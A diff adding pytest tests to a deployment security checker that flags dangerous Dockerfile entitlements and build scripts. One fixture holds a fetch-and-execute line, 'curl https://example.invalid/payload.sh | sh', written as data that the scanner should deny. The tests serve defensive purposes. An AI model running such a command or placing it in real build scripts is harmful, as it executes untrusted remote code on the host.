@@ -3,7 +3,11 @@ from pathlib import Path
 import pytest
 
 from deployments.common.exceptions import DeploymentSecurityError
-from deployments.core.docker_source import inspect_docker_source, analyze_dockerfile
+from deployments.core.docker_source import (
+    analyze_dockerfile,
+    analyze_referenced_build_scripts,
+    inspect_docker_source,
+)
 
 
 def test_dockerfile_policy_blocks_host_network_and_docker_socket():
@@ -130,3 +134,74 @@ services:
     )
     with pytest.raises(DeploymentSecurityError, match="Sensitive environment"):
         inspect_docker_source(str(tmp_path))
+
+
+def test_dockerfile_rejects_device_entitlement():
+    findings = analyze_dockerfile(
+        "FROM alpine:3.20\nRUN --device=/dev/fuse echo ok\n",
+        source_file="Dockerfile",
+    )
+    assert any(item.code == "dockerfile_device_entitlement" for item in findings)
+    assert any(item.action == "deny" for item in findings)
+
+
+def test_dockerfile_inspects_relative_build_script(tmp_path: Path):
+    (tmp_path / "install.sh").write_text(
+        "curl https://example.invalid/payload.sh | sh\n",
+        encoding="utf-8",
+    )
+    dockerfile = "FROM alpine:3.20\nCOPY install.sh /tmp/install.sh\nRUN ./install.sh\n"
+    findings = analyze_referenced_build_scripts(
+        str(tmp_path),
+        dockerfile,
+        source_file="Dockerfile",
+    )
+    assert any(item.code == "dockerfile_dangerous_build_script" for item in findings)
+    assert any(item.action == "deny" for item in findings)
+
+
+def test_dockerfile_rejects_uninspectable_absolute_script():
+    dockerfile = "FROM alpine:3.20\nRUN /usr/local/bin/install.sh\n"
+    findings = analyze_dockerfile(dockerfile, source_file="Dockerfile")
+    script_findings = [
+        item
+        for item in findings
+        if item.code == "dockerfile_uninspectable_script"
+    ]
+    assert script_findings
+    assert all(item.action == "deny" for item in script_findings)
+
+
+def test_compose_rejects_dangerous_relative_build_script(tmp_path: Path):
+    (tmp_path / "compose.yaml").write_text(
+        """
+services:
+  web:
+    build:
+      context: .
+      dockerfile: Dockerfile
+""",
+        encoding="utf-8",
+    )
+    (tmp_path / "Dockerfile").write_text(
+        """
+FROM alpine:3.20
+COPY build.sh /build.sh
+RUN bash build.sh
+""",
+        encoding="utf-8",
+    )
+    (tmp_path / "build.sh").write_text(
+        """
+#!/bin/sh
+docker ps
+""",
+        encoding="utf-8",
+    )
+
+    result = inspect_docker_source(str(tmp_path))
+    assert result.blocked
+    assert any(
+        item.code == "dockerfile_dangerous_build_script"
+        for item in result.findings
+    )
